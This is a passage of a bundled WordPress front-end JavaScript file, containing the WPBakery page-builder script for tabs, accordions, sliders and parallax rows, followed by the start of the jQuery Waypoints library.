// source --> https://kendrew.ca/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=5.5.2
function vc_js() {
    vc_toggleBehaviour(), vc_tabsBehaviour(), vc_accordionBehaviour(), vc_teaserGrid(), vc_carouselBehaviour(), vc_slidersBehaviour(), vc_prettyPhoto(), vc_googleplus(), vc_pinterest(), vc_progress_bar(), vc_plugin_flexslider(), vc_google_fonts(), vc_gridBehaviour(), vc_rowBehaviour(), vc_prepareHoverBox(), vc_googleMapsPointer(), vc_ttaActivation(), jQuery(document).trigger("vc_js"), window.setTimeout(vc_waypoints, 500)
}
document.documentElement.className += " js_active ", document.documentElement.className += "ontouchstart" in document.documentElement ? " vc_mobile " : " vc_desktop ",
    function() {
        for (var prefix = ["-webkit-", "-moz-", "-ms-", "-o-", ""], i = 0; i < prefix.length; i++) prefix[i] + "transform" in document.documentElement.style && (document.documentElement.className += " vc_transform ")
    }(), "function" != typeof window.vc_plugin_flexslider && (window.vc_plugin_flexslider = function($parent) {
    ($parent ? $parent.find(".wpb_flexslider") : jQuery(".wpb_flexslider")).each(function() {
        var this_element = jQuery(this),
            sliderTimeout = 1e3 * parseInt(this_element.attr("data-interval")),
            sliderFx = this_element.attr("data-flex_fx"),
            slideshow = !0;
        0 === sliderTimeout && (slideshow = !1), this_element.is(":visible") && this_element.flexslider({
            animation: sliderFx,
            slideshow: slideshow,
            slideshowSpeed: sliderTimeout,
            sliderSpeed: 800,
            smoothHeight: !0
        })
    })
}), "function" != typeof window.vc_googleplus && (window.vc_googleplus = function() {
    0 < jQuery(".wpb_googleplus").length && function() {
        var po = document.createElement("script");
        po.type = "text/javascript", po.async = !0, po.src = "//apis.google.com/js/plusone.js";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(po, s)
    }()
}), "function" != typeof window.vc_pinterest && (window.vc_pinterest = function() {
    0 < jQuery(".wpb_pinterest").length && function() {
        var po = document.createElement("script");
        po.type = "text/javascript", po.async = !0, po.src = "//assets.pinterest.com/js/pinit.js";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(po, s)
    }()
}), "function" != typeof window.vc_progress_bar && (window.vc_progress_bar = function() {
    void 0 !== jQuery.fn.waypoint && jQuery(".vc_progress_bar").waypoint(function() {
        jQuery(this).find(".vc_single_bar").each(function(index) {
            var bar = jQuery(this).find(".vc_bar"),
                val = bar.data("percentage-value");
            setTimeout(function() {
                bar.css({
                    width: val + "%"
                })
            }, 200 * index)
        })
    }, {
        offset: "85%"
    })
}), "function" != typeof window.vc_waypoints && (window.vc_waypoints = function() {
    void 0 !== jQuery.fn.waypoint && jQuery(".wpb_animate_when_almost_visible:not(.wpb_start_animation)").waypoint(function() {
        jQuery(this).addClass("wpb_start_animation animated")
    }, {
        offset: "85%"
    })
}), "function" != typeof window.vc_toggleBehaviour && (window.vc_toggleBehaviour = function($el) {
    function event(e) {
        e && e.preventDefault && e.preventDefault();
        var element = jQuery(this).closest(".vc_toggle"),
            content = element.find(".vc_toggle_content");
        element.hasClass("vc_toggle_active") ? content.slideUp({
            duration: 300,
            complete: function() {
                element.removeClass("vc_toggle_active")
            }
        }) : content.slideDown({
            duration: 300,
            complete: function() {
                element.addClass("vc_toggle_active")
            }
        })
    }
    $el ? $el.hasClass("vc_toggle_title") ? $el.unbind("click").click(event) : $el.find(".vc_toggle_title").unbind("click").click(event) : jQuery(".vc_toggle_title").unbind("click").on("click", event)
}), "function" != typeof window.vc_tabsBehaviour && (window.vc_tabsBehaviour = function($tab) {
    if (jQuery.ui) {
        var $call = $tab || jQuery(".wpb_tabs, .wpb_tour"),
            ver = jQuery.ui && jQuery.ui.version ? jQuery.ui.version.split(".") : "1.10",
            old_version = 1 === parseInt(ver[0]) && parseInt(ver[1]) < 9;
        $call.each(function(index) {
            var $tabs, interval = jQuery(this).attr("data-interval"),
                tabs_array = [];
            if ($tabs = jQuery(this).find(".wpb_tour_tabs_wrapper").tabs({
                show: function(event, ui) {
                    wpb_prepare_tab_content(event, ui)
                },
                beforeActivate: function(event, ui) {
                    1 !== ui.newPanel.index() && ui.newPanel.find(".vc_pie_chart:not(.vc_ready)")
                },
                activate: function(event, ui) {
                    wpb_prepare_tab_content(event, ui)
                }
            }), interval && 0 < interval) try {
                $tabs.tabs("rotate", 1e3 * interval)
            } catch (e) {
                window.console && window.console.warn && console.warn(e)
            }
            jQuery(this).find(".wpb_tab").each(function() {
                tabs_array.push(this.id)
            }), jQuery(this).find(".wpb_tabs_nav li").click(function(e) {
                return e.preventDefault(), old_version ? $tabs.tabs("select", jQuery("a", this).attr("href")) : $tabs.tabs("option", "active", jQuery(this).index()), !1
            }), jQuery(this).find(".wpb_prev_slide a, .wpb_next_slide a").click(function(e) {
                if (e.preventDefault(), old_version) {
                    var index = $tabs.tabs("option", "selected");
                    jQuery(this).parent().hasClass("wpb_next_slide") ? index++ : index--, index < 0 ? index = $tabs.tabs("length") - 1 : index >= $tabs.tabs("length") && (index = 0), $tabs.tabs("select", index)
                } else {
                    index = $tabs.tabs("option", "active");
                    var length = $tabs.find(".wpb_tab").length;
                    index = jQuery(this).parent().hasClass("wpb_next_slide") ? length <= index + 1 ? 0 : index + 1 : index - 1 < 0 ? length - 1 : index - 1, $tabs.tabs("option", "active", index)
                }
            })
        })
    }
}), "function" != typeof window.vc_accordionBehaviour && (window.vc_accordionBehaviour = function() {
    jQuery(".wpb_accordion").each(function(index) {
        var $tabs, $this = jQuery(this),
            active_tab = ($this.attr("data-interval"), !isNaN(jQuery(this).data("active-tab")) && 0 < parseInt($this.data("active-tab")) && parseInt($this.data("active-tab")) - 1),
            collapsible = !1 === active_tab || "yes" === $this.data("collapsible");
        $tabs = $this.find(".wpb_accordion_wrapper").accordion({
            header: "> div > h3",
            autoHeight: !1,
            heightStyle: "content",
            active: active_tab,
            collapsible: collapsible,
            navigation: !0,
            activate: vc_accordionActivate,
            change: function(event, ui) {
                void 0 !== jQuery.fn.isotope && ui.newContent.find(".isotope").isotope("layout"), vc_carouselBehaviour(ui.newPanel)
            }
        }), !0 === $this.data("vcDisableKeydown") && ($tabs.data("uiAccordion")._keydown = function() {})
    })
}), "function" != typeof window.vc_teaserGrid && (window.vc_teaserGrid = function() {
    var layout_modes = {
        fitrows: "fitRows",
        masonry: "masonry"
    };
    jQuery(".wpb_grid .teaser_grid_container:not(.wpb_carousel), .wpb_filtered_grid .teaser_grid_container:not(.wpb_carousel)").each(function() {
        var $container = jQuery(this),
            $thumbs = $container.find(".wpb_thumbnails"),
            layout_mode = $thumbs.attr("data-layout-mode");
        $thumbs.isotope({
            itemSelector: ".isotope-item",
            layoutMode: void 0 === layout_modes[layout_mode] ? "fitRows" : layout_modes[layout_mode]
        }), $container.find(".categories_filter a").data("isotope", $thumbs).click(function(e) {
            e.preventDefault();
            var $thumbs = jQuery(this).data("isotope");
            jQuery(this).parent().parent().find(".active").removeClass("active"), jQuery(this).parent().addClass("active"), $thumbs.isotope({
                filter: jQuery(this).attr("data-filter")
            })
        }), jQuery(window).bind("load resize", function() {
            $thumbs.isotope("layout")
        })
    })
}), "function" != typeof window.vc_carouselBehaviour && (window.vc_carouselBehaviour = function($parent) {
    ($parent ? $parent.find(".wpb_carousel") : jQuery(".wpb_carousel")).each(function() {
        var $this = jQuery(this);
        if (!0 !== $this.data("carousel_enabled") && $this.is(":visible")) {
            $this.data("carousel_enabled", !0);
            getColumnsCount(jQuery(this));
            jQuery(this).hasClass("columns_count_1") && 900;
            var carousele_li = jQuery(this).find(".wpb_thumbnails-fluid li");
            carousele_li.css({
                "margin-right": carousele_li.css("margin-left"),
                "margin-left": 0
            });
            var fluid_ul = jQuery(this).find("ul.wpb_thumbnails-fluid");
            fluid_ul.width(fluid_ul.width() + 300), jQuery(window).resize(function() {
                screen_size != (screen_size = getSizeName()) && window.setTimeout("location.reload()", 20)
            })
        }
    })
}), "function" != typeof window.vc_slidersBehaviour && (window.vc_slidersBehaviour = function() {
    jQuery(".wpb_gallery_slides").each(function(index) {
        var $imagesGrid, this_element = jQuery(this);
        if (this_element.hasClass("wpb_slider_nivo")) {
            var sliderTimeout = 1e3 * this_element.attr("data-interval");
            0 === sliderTimeout && (sliderTimeout = 9999999999), this_element.find(".nivoSlider").nivoSlider({
                effect: "boxRainGrow,boxRain,boxRainReverse,boxRainGrowReverse",
                slices: 15,
                boxCols: 8,
                boxRows: 4,
                animSpeed: 800,
                pauseTime: sliderTimeout,
                startSlide: 0,
                directionNav: !0,
                directionNavHide: !0,
                controlNav: !0,
                keyboardNav: !1,
                pauseOnHover: !0,
                manualAdvance: !1,
                prevText: "Prev",
                nextText: "Next"
            })
        } else this_element.hasClass("wpb_image_grid") && (jQuery.fn.imagesLoaded ? $imagesGrid = this_element.find(".wpb_image_grid_ul").imagesLoaded(function() {
            $imagesGrid.isotope({
                itemSelector: ".isotope-item",
                layoutMode: "fitRows"
            })
        }) : this_element.find(".wpb_image_grid_ul").isotope({
            itemSelector: ".isotope-item",
            layoutMode: "fitRows"
        }))
    })
}), "function" != typeof window.vc_prettyPhoto && (window.vc_prettyPhoto = function() {
    try {
        jQuery && jQuery.fn && jQuery.fn.prettyPhoto && jQuery('a.prettyphoto, .gallery-icon a[href*=".jpg"]').prettyPhoto({
            animationSpeed: "normal",
            hook: "data-rel",
            padding: 15,
            opacity: .7,
            showTitle: !0,
            allowresize: !0,
            counter_separator_label: "/",
            hideflash: !1,
            deeplinking: !1,
            modal: !1,
            callback: function() {
                -1 < location.href.indexOf("#!prettyPhoto") && (location.hash = "")
            },
            social_tools: ""
        })
    } catch (err) {
        window.console && window.console.warn && console.warn(err)
    }
}), "function" != typeof window.vc_google_fonts && (window.vc_google_fonts = function() {
    return !1
}), window.vcParallaxSkroll = !1, "function" != typeof window.vc_rowBehaviour && (window.vc_rowBehaviour = function() {
    var vcSkrollrOptions, callSkrollInit, $ = window.jQuery;

    function fullWidthRow() {
        var $elements = $('[data-vc-full-width="true"]');
        $.each($elements, function(key, item) {
            var $el = $(this);
            $el.addClass("vc_hidden");
            var $el_full = $el.next(".vc_row-full-width");
            if ($el_full.length || ($el_full = $el.parent().next(".vc_row-full-width")), $el_full.length) {
                var padding, paddingRight, el_margin_left = parseInt($el.css("margin-left"), 10),
                    el_margin_right = parseInt($el.css("margin-right"), 10),
                    offset = 0 - $el_full.offset().left - el_margin_left,
                    width = $(window).width();
                if ("rtl" === $el.css("direction") && (offset -= $el_full.width(), offset += width, offset += el_margin_left, offset += el_margin_right), $el.css({
                    position: "relative",
                    left: offset,
                    "box-sizing": "border-box",
                    width: width
                }), !$el.data("vcStretchContent")) "rtl" === $el.css("direction") ? ((padding = $el_full.offset().left) < 0 && (padding = 0), (paddingRight = offset) < 0 && (paddingRight = 0)) : ((padding = -1 * offset) < 0 && (padding = 0), (paddingRight = width - padding - $el_full.width() + el_margin_left + el_margin_right) < 0 && (paddingRight = 0)), $el.css({
                    "padding-left": padding + "px",
                    "padding-right": paddingRight + "px"
                });
                $el.attr("data-vc-full-width-init", "true"), $el.removeClass("vc_hidden"), $(document).trigger("vc-full-width-row-single", {
                    el: $el,
                    offset: offset,
                    marginLeft: el_margin_left,
                    marginRight: el_margin_right,
                    elFull: $el_full,
                    width: width
                })
            }
        }), $(document).trigger("vc-full-width-row", $elements)
    }

    function fullHeightRow() {
        var windowHeight, offsetTop, fullHeight, $element = $(".vc_row-o-full-height:first");
        $element.length && (windowHeight = $(window).height(), (offsetTop = $element.offset().top) < windowHeight && (fullHeight = 100 - offsetTop / (windowHeight / 100), $element.css("min-height", fullHeight + "vh")));
        $(document).trigger("vc-full-height-row", $element)
    }
    $(window).off("resize.vcRowBehaviour").on("resize.vcRowBehaviour", fullWidthRow).on("resize.vcRowBehaviour", fullHeightRow), fullWidthRow(), fullHeightRow(), (0 < window.navigator.userAgent.indexOf("MSIE ") || navigator.userAgent.match(/Trident.*rv\:11\./)) && $(".vc_row-o-full-height").each(function() {
        "flex" === $(this).css("display") && $(this).wrap('<div class="vc_ie-flexbox-fixer"></div>')
    }), vc_initVideoBackgrounds(), callSkrollInit = !1, window.vcParallaxSkroll && window.vcParallaxSkroll.destroy(), $(".vc_parallax-inner").remove(), $("[data-5p-top-bottom]").removeAttr("data-5p-top-bottom data-30p-top-bottom"), $("[data-vc-parallax]").each(function() {
        var skrollrSize, skrollrStart, $parallaxElement, parallaxImage, youtubeId;
        callSkrollInit = !0, "on" === $(this).data("vcParallaxOFade") && $(this).children().attr("data-5p-top-bottom", "opacity:0;").attr("data-30p-top-bottom", "opacity:1;"), skrollrSize = 100 * $(this).data("vcParallax"), ($parallaxElement = $("<div />").addClass("vc_parallax-inner").appendTo($(this))).height(skrollrSize + "%"), (youtubeId = vcExtractYoutubeId(parallaxImage = $(this).data("vcParallaxImage"))) ? insertYoutubeVideoAsBackground($parallaxElement, youtubeId) : void 0 !== parallaxImage && $parallaxElement.css("background-image", "url(" + parallaxImage + ")"), skrollrStart = -(skrollrSize - 100), $parallaxElement.attr("data-bottom-top", "top: " + skrollrStart + "%;").attr("data-top-bottom", "top: 0%;")
    }), callSkrollInit && window.skrollr && (vcSkrollrOptions = {
        forceHeight: !1,
        smoothScrolling: !1,
        mobileCheck: function() {
            return !1
        }
    }, window.vcParallaxSkroll = skrollr.init(vcSkrollrOptions), window.vcParallaxSkroll)
}), "function" != typeof window.vc_gridBehaviour && (window.vc_gridBehaviour = function() {
    jQuery.fn.vcGrid && jQuery("[data-vc-grid]").vcGrid()
}), "function" != typeof window.getColumnsCount && (window.getColumnsCount = function(el) {
    for (var find = !1, i = 1; !1 === find;) {
        if (el.hasClass("columns_count_" + i)) return find = !0, i;
        i++
    }
});
var screen_size = getSizeName();

function getSizeName() {
    var screen_w = jQuery(window).width();
    return 1170 < screen_w ? "desktop_wide" : 960 < screen_w && screen_w < 1169 ? "desktop" : 768 < screen_w && screen_w < 959 ? "tablet" : 300 < screen_w && screen_w < 767 ? "mobile" : screen_w < 300 ? "mobile_portrait" : ""
}

function loadScript(url, $obj, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript", script.readyState && (script.onreadystatechange = function() {
        "loaded" !== script.readyState && "complete" !== script.readyState || (script.onreadystatechange = null, callback())
    }), script.src = url, $obj.get(0).appendChild(script)
}

function vc_ttaActivation() {
    jQuery("[data-vc-accordion]").on("show.vc.accordion", function(e) {
        var $ = window.jQuery,
            ui = {};
        ui.newPanel = $(this).data("vc.accordion").getTarget(), window.wpb_prepare_tab_content(e, ui)
    })
}

function vc_accordionActivate(event, ui) {
    if (ui.newPanel.length && ui.newHeader.length) {
        var $pie_charts = ui.newPanel.find(".vc_pie_chart:not(.vc_ready)"),
            $round_charts = ui.newPanel.find(".vc_round-chart"),
            $line_charts = ui.newPanel.find(".vc_line-chart"),
            $carousel = ui.newPanel.find('[data-ride="vc_carousel"]');
        void 0 !== jQuery.fn.isotope && ui.newPanel.find(".isotope, .wpb_image_grid_ul").isotope("layout"), ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").length && ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").each(function() {
            var grid = jQuery(this).data("vcGrid");
            grid && grid.gridBuilder && grid.gridBuilder.setMasonry && grid.gridBuilder.setMasonry()
        }), vc_carouselBehaviour(ui.newPanel), vc_plugin_flexslider(ui.newPanel), $pie_charts.length && jQuery.fn.vcChat && $pie_charts.vcChat(), $round_charts.length && jQuery.fn.vcRoundChart && $round_charts.vcRoundChart({
            reload: !1
        }), $line_charts.length && jQuery.fn.vcLineChart && $line_charts.vcLineChart({
            reload: !1
        }), $carousel.length && jQuery.fn.carousel && $carousel.carousel("resizeAction"), ui.newPanel.parents(".isotope").length && ui.newPanel.parents(".isotope").each(function() {
            jQuery(this).isotope("layout")
        })
    }
}

function initVideoBackgrounds() {
    return window.console && window.console.warn && window.console.warn("this function is deprecated use vc_initVideoBackgrounds"), vc_initVideoBackgrounds()
}

function vc_initVideoBackgrounds() {
    jQuery("[data-vc-video-bg]").each(function() {
        var youtubeId, $element = jQuery(this);
        $element.data("vcVideoBg") ? ((youtubeId = vcExtractYoutubeId($element.data("vcVideoBg"))) && ($element.find(".vc_video-bg").remove(), insertYoutubeVideoAsBackground($element, youtubeId)), jQuery(window).on("grid:items:added", function(event, $grid) {
            $element.has($grid).length && vcResizeVideoBackground($element)
        })) : $element.find(".vc_video-bg").remove()
    })
}

function insertYoutubeVideoAsBackground($element, youtubeId, counter) {
    if ("undefined" == typeof YT || void 0 === YT.Player) return 100 < (counter = void 0 === counter ? 0 : counter) ? void console.warn("Too many attempts to load YouTube api") : void setTimeout(function() {
        insertYoutubeVideoAsBackground($element, youtubeId, counter++)
    }, 100);
    var $container = $element.prepend('<div class="vc_video-bg vc_hidden-xs"><div class="inner"></div></div>').find(".inner");
    new YT.Player($container[0], {
        width: "100%",
        height: "100%",
        videoId: youtubeId,
        playerVars: {
            playlist: youtubeId,
            iv_load_policy: 3,
            enablejsapi: 1,
            disablekb: 1,
            autoplay: 1,
            controls: 0,
            showinfo: 0,
            rel: 0,
            loop: 1,
            wmode: "transparent"
        },
        events: {
            onReady: function(event) {
                event.target.mute().setLoop(!0)
            }
        }
    }), vcResizeVideoBackground($element), jQuery(window).bind("resize", function() {
        vcResizeVideoBackground($element)
    })
}

function vcResizeVideoBackground($element) {
    var iframeW, iframeH, marginLeft, marginTop, containerW = $element.innerWidth(),
        containerH = $element.innerHeight();
    containerW / containerH < 16 / 9 ? (iframeW = containerH * (16 / 9), iframeH = containerH, marginLeft = -Math.round((iframeW - containerW) / 2) + "px", marginTop = -Math.round((iframeH - containerH) / 2) + "px") : (iframeH = (iframeW = containerW) * (9 / 16), marginTop = -Math.round((iframeH - containerH) / 2) + "px", marginLeft = -Math.round((iframeW - containerW) / 2) + "px"), iframeW += "px", iframeH += "px", $element.find(".vc_video-bg iframe").css({
        maxWidth: "1000%",
        marginLeft: marginLeft,
        marginTop: marginTop,
        width: iframeW,
        height: iframeH
    })
}

function vcExtractYoutubeId(url) {
    if (void 0 === url) return !1;
    var id = url.match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);
    return null !== id && id[1]
}
if ("function" != typeof window.wpb_prepare_tab_content && (window.wpb_prepare_tab_content = function(event, ui) {
    var $ui_panel, $google_maps, panel = ui.panel || ui.newPanel,
        $pie_charts = panel.find(".vc_pie_chart:not(.vc_ready)"),
        $round_charts = panel.find(".vc_round-chart"),
        $line_charts = panel.find(".vc_line-chart"),
        $carousel = panel.find('[data-ride="vc_carousel"]');
    if (vc_carouselBehaviour(), vc_plugin_flexslider(panel), ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").length && ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").each(function() {
        var grid = jQuery(this).data("vcGrid");
        grid && grid.gridBuilder && grid.gridBuilder.setMasonry && grid.gridBuilder.setMasonry()
    }), panel.find(".vc_masonry_media_grid, .vc_masonry_grid").length && panel.find(".vc_masonry_media_grid, .vc_masonry_grid").each(function() {
        var grid = jQuery(this).data("vcGrid");
        grid && grid.gridBuilder && grid.gridBuilder.setMasonry && grid.gridBuilder.setMasonry()
    }), $pie_charts.length && jQuery.fn.vcChat && $pie_charts.vcChat(), $round_charts.length && jQuery.fn.vcRoundChart && $round_charts.vcRoundChart({
        reload: !1
    }), $line_charts.length && jQuery.fn.vcLineChart && $line_charts.vcLineChart({
        reload: !1
    }), $carousel.length && jQuery.fn.carousel && $carousel.carousel("resizeAction"), $ui_panel = panel.find(".isotope, .wpb_image_grid_ul"), $google_maps = panel.find(".wpb_gmaps_widget"), 0 < $ui_panel.length && $ui_panel.isotope("layout"), $google_maps.length && !$google_maps.is(".map_ready")) {
        var $frame = $google_maps.find("iframe");
        $frame.attr("src", $frame.attr("src")), $google_maps.addClass("map_ready")
    }
    panel.parents(".isotope").length && panel.parents(".isotope").each(function() {
        jQuery(this).isotope("layout")
    })
}), "function" != typeof window.vc_googleMapsPointer)
    function vc_googleMapsPointer() {
        var $ = window.jQuery,
            $wpbGmapsWidget = $(".wpb_gmaps_widget");
        $wpbGmapsWidget.click(function() {
            $("iframe", this).css("pointer-events", "auto")
        }), $wpbGmapsWidget.mouseleave(function() {
            $("iframe", this).css("pointer-events", "none")
        }), $(".wpb_gmaps_widget iframe").css("pointer-events", "none")
    }

function vc_setHoverBoxPerspective(hoverBox) {
    hoverBox.each(function() {
        var $this = jQuery(this),
            perspective = 4 * $this.width() + "px";
        $this.css("perspective", perspective)
    })
}

function vc_setHoverBoxHeight(hoverBox) {
    hoverBox.each(function() {
        var $this = jQuery(this),
            hoverBoxInner = $this.find(".vc-hoverbox-inner");
        hoverBoxInner.css("min-height", 0);
        var frontHeight = $this.find(".vc-hoverbox-front-inner").outerHeight(),
            backHeight = $this.find(".vc-hoverbox-back-inner").outerHeight(),
            hoverBoxHeight = backHeight < frontHeight ? frontHeight : backHeight;
        hoverBoxHeight < 250 && (hoverBoxHeight = 250), hoverBoxInner.css("min-height", hoverBoxHeight + "px")
    })
}

function vc_prepareHoverBox() {
    var hoverBox = jQuery(".vc-hoverbox");
    vc_setHoverBoxHeight(hoverBox), vc_setHoverBoxPerspective(hoverBox)
}
jQuery(document).ready(vc_prepareHoverBox), jQuery(window).resize(vc_prepareHoverBox), jQuery(document).ready(function($) {
    window.vc_js()
});
// source --> https://kendrew.ca/wp-content/plugins/js_composer/assets/lib/waypoints/waypoints.min.js?ver=5.5.2
// Generated by CoffeeScript 1.6.2
/*
jQuery Waypoints - v2.0.2
Copyright (c) 2011-2013 Caleb Troughton
Dual licensed under the MIT license and GPL license.
https://github.com/imakewebthings/jquery-waypoints/blob/master/licenses.txt
*/
(function() {
    var t = [].indexOf || function(t) {
            for (var e = 0, n = this.length; e < n; e++) {
                if (e in this && this[e] === t) return e
            }
            return -1
        },
        e = [].slice;
    (function(t, e) {
        if (typeof define === "function" && define.amd) {
            return define("waypoints", ["jquery"], function(n) {
                return e(n, t)
            })
        } else {
            return e(t.jQuery, t)
        }
    })(this, function(n, r) {
        var i, o, l, s, f, u, a, c, h, d, p, y, v, w, g, m;
        i = n(r);
        c = t.call(r, "ontouchstart") >= 0;
        s = {
            horizontal: {},
            vertical: {}
        };
        f = 1;
        a = {};
        u = "waypoints-context-id";
        p = "resize.waypoints";
        y = "scroll.waypoints";
        v = 1;
        w = "waypoints-waypoint-ids";
        g = "waypoint";
        m = "waypoints";
        o = function() {
            function t(t) {
                var e = this;
                this.$element = t;
                this.element = t[0];
                this.didResize = false;
                this.didScroll = false;
                this.id = "context" + f++;
                this.oldScroll = {
                    x: t.scrollLeft(),
                    y: t.scrollTop()
                };
                this.waypoints = {
                    horizontal: {},
                    vertical: {}
                };
                t.data(u, this.id);
                a[this.id] = this;
                t.bind(y, function() {
                    var t;
                    if (!(e.didScroll || c)) {
                        e.didScroll = true;
                        t = function() {
                            e.doScroll();
                            return e.didScroll = false
                        };
                        return r.setTimeout(t, n[m].settings.scrollThrottle)
                    }
                });
                t.bind(p, function() {
                    var t;
                    if (!e.didResize) {
                        e.didResize = true;
                        t = function() {
                            n[m]("refresh");
                            return e.didResize = false
                        };
                        return r.setTimeout(t, n[m].settings.resizeThrottle)
                    }
                })
            }
            t.prototype.doScroll = function() {
                var t, e = this;
                t = {
                    horizontal: {
                        newScroll: this.$element.scrollLeft(),
                        oldScroll: this.oldScroll.x,
                        forward: "right",
                        backward: "left"
                    },
                    vertical: {
                        newScroll: this.$element.scrollTop(),
                        oldScroll: this.oldScroll.y,
                        forward: "down",
                        backward: "up"
                    }
                };
                if (c && (!t.vertical.oldScroll || !t.vertical.newScroll)) {
                    n[m]("refresh")
                }
                n.each(t, function(t, r) {
                    var i, o, l;
                    l = [];
                    o = r.newScroll > r.oldScroll;
                    i = o ? r.forward : r.backward;
                    n.each(e.waypoints[t], function(t, e) {
                        var n, i;
                        if (r.oldScroll < (n = e.offset) && n <= r.newScroll) {
                            return l.push(e)
                        } else if (r.newScroll < (i = e.offset) && i <= r.oldScroll) {
                            return l.push(e)
                        }
                    });
                    l.sort(function(t, e) {
                        return t.offset - e.offset
                    });
                    if (!o) {
                        l.reverse()
                    }
                    return n.each(l, function(t, e) {
                        if (e.options.continuous || t === l.length - 1) {
                            return e.trigger([i])
                        }
                    })
                });
                return this.oldScroll = {
                    x: t.horizontal.newScroll,
                    y: t.vertical.newScroll
                }
            };
            t.prototype.refresh = function() {
                var t, e, r, i = this;
                r = n.isWindow(this.element);
                e = this.$element.offset();
                this.doScroll();
                t = {
                    horizontal: {
                        contextOffset: r ? 0 : e.left,
                        contextScroll: r ? 0 : this.oldScroll.x,
                        contextDimension: this.$element.width(),
                        oldScroll: this.oldScroll.x,
                        forward: "right",
                        backward: "left",
                        offsetProp: "left"
                    },
                    vertical: {
                        contextOffset: r ? 0 : e.top,
                        contextScroll: r ? 0 : this.oldScroll.y,
                        contextDimension: r ? n[m]("viewportHeight") : this.$element.height(),
                        oldScroll: this.oldScroll.y,
                        forward: "down",
                        backward: "up",
                        offsetProp: "top"
                    }
                };
                return n.each(t, function(t, e) {
                    return n.each(i.waypoints[t], function(t, r) {
                        var i, o, l, s, f;
                        i = r.options.offset;
                        l = r.offset;
                        o = n.isWindow(r.element) ? 0 : r.$element.offset()[e.offsetProp];
                        if (n.isFunction(i)) {
                            i = i.apply(r.element)
                        } else if (typeof i === "string") {
                            i = parseFloat(i);
                            if (r.options.offset.indexOf("%") > -1) {
                                i = Math.ceil(e.contextDimension * i / 100)
                            }
                        }
                        r.offset = o - e.contextOffset + e.contextScroll - i;
                        if (r.options.onlyOnScroll && l != null || !r.enabled) {
                            return
                        }
                        if (l !== null && l < (s = e.oldScroll) && s <= r.offset) {
                            return r.trigger([e.backward])
                        } else if (l !== null && l > (f = e.oldScroll) && f >= r.offset) {
                            return r.trigger([e.forward])
                        } else if (l === null && e.oldScroll >= r.offset) {
                            return r.trigger([e.forward])
                        }
                    })
                })
            };
            t.prototype.checkEmpty = function() {
                if (n.isEmptyObject(this.waypoints.horizontal) && n.isEmptyObject(this.waypoints.vertical)) {
                    this.$element.unbind([p, y].join(" "));
                    return delete a[this.id]
                }
            };
            return t
        }();
        l = function() {
            function t(t, e, r) {
                var i, o;
                r = n.extend({}, n.fn[g].defaults, r);
                if (r.offset === "bottom-in-view") {
                    r.offset = function() {
                        var t;
                        t = n[m]("viewportHeight");
                        if (!n.isWindow(e.element)) {
                            t = e.$element.height()
                        }
                        return t - n(this).outerHeight()
                    }
                }
                this.$element = t;
                this.element = t[0];
                this.axis = r.horizontal ? "horizontal" : "vertical";
                this.callback = r.handler;
                this.context = e;
                this.enabled = r.enabled;
                this.id = "waypoints" + v++;
                this.offset = null;
                this.options = r;
                e.waypoints[this.axis][this.id] = this;
                s[this.axis][this.id] = this;
                i = (o = t.data(w)) != null ? o : [];
                i.push(this.id);
                t.data(w, i)
            }
            t.prototype.trigger = function(t) {
                if (!this.enabled) {
                    return
                }
                if (this.callback != null) {
                    this.callback.apply(this.element, t)
                }
                if (this.options.triggerOnce) {
                    return this.destroy()
                }
            };
            t.prototype.disable = function() {
                return this.enabled = false
            };
            t.prototype.enable = function() {
                this.context.refresh();
                return this.enabled = true
            };
            t.prototype.destroy = function() {
                delete s[this.axis][this.id];
                delete this.context.waypoints[this.axis][this.id];
                return this.context.checkEmpty()
            };
            t.getWaypointsByElement = function(t) {
                var e, r;
                r = n(t).data(w);
                if (!r) {
                    return []
                }
                e = n.extend({}, s.horizontal, s.vertical);
                return n.map(r, function(t) {
                    return e[t]
                })
            };
            return t
        }();
        d = {
            init: function(t, e) {
                var r;
                if (e == null) {
                    e = {}
                }
                if ((r = e.handler) == null) {
                    e.handler = t
                }
                this.each(function() {
                    var t, r, i, s;
                    t = n(this);
                    i = (s = e.context) != null ? s : n.fn[g].defaults.context;
                    if (!n.isWindow(i)) {
                        i = t.closest(i)
                    }
                    i = n(i);
                    r = a[i.data(u)];
                    if (!r) {
                        r = new o(i)
                    }
                    return new l(t, r, e)
                });
                n[m]("refresh");
                return this
            },
            disable: function() {
                return d._invoke(this, "disable")
            },
            enable: function() {
                return d._invoke(this, "enable")
            },
            destroy: function() {
                return d._invoke(this, "destroy")
            },
            prev: function(t, e) {
                return d._traverse.call(this, t, e, function(t, e, n) {
                    if (e > 0) {
                        return t.push(n[e - 1])
                    }
                })
            },
            next: function(t, e) {
                return d._traverse.call(this, t, e, function(t, e, n) {
                    if (e < n.length - 1) {
                        return t.push(n[e + 1])
                    }
                })
            },
            _traverse: function(t, e, i) {
                var o, l;
                if (t == null) {
                    t = "vertical"
                }
                if (e == null) {
                    e = r
                }
                l = h.aggregate(e);
                o = [];
                this.each(function() {
                    var e;
                    e = n.inArray(this, l[t]);
                    return i(o, e, l[t])
                });
                return this.pushStack(o)
            },
            _invoke: function(t, e) {
                t.each(function() {
                    var t;
                    t = l.getWaypointsByElement(this);
                    return n.each(t, function(t, n) {
                        n[e]();
                        return true
                    })
                });
                return this
            }
        };
        n.fn[g] = function() {
            var t, r;
            r = arguments[0], t = 2 <= arguments.length ? e.call(arguments, 1) : [];
            if (d[r]) {
                return d[r].apply(this, t)
            } else if (n.isFunction(r)) {
                return d.init.apply(this, arguments)
            } else if (n.isPlainObject(r)) {
                return d.init.apply(this, [null, r])
            } else if (!r) {
                return n.error("jQuery Waypoints needs a callback function or handler option.")
            } else {
                return n.error("The " + r + " method does not exist in jQuery Waypoints.")
            }
        };
        n.fn[g].defaults = {
            context: r,
            continuous: true,
            enabled: true,
            horizontal: false,
            offset: 0,
            triggerOnce: false
        };
        h = {
            refresh: function() {
                return n.each(a, function(t, e) {
                    return e.refresh()
                })
            },
